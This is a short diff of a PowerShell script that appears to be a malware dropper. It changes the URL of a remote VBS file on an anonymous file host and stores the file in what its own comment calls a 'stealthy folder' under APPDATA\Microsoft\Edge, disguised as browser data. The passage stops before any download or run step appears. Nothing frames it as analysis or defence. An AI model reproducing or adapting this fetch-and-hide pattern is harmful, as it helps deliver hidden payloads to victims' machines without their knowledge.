@@ -1,9 +1,9 @@
 # Define URL of the VBS file
-$url = "https://files.catbox.moe/eqlsi1.vbs"
+$url = "https://files.catbox.moe/zenycn.vbs"
 
 # Define a stealthy folder to store the file
 $destinationFolder = Join-Path $env:APPDATA "Microsoft\Edge"
-$destinationPath = Join-Path $destinationFolder "eqlsi1.vbs"
+$destinationPath = Join-Path $destinationFolder "zenycn.vbs"
 
 # Create the folder if it doesn't exist
 if (-not (Test-Path $destinationFolder)) {
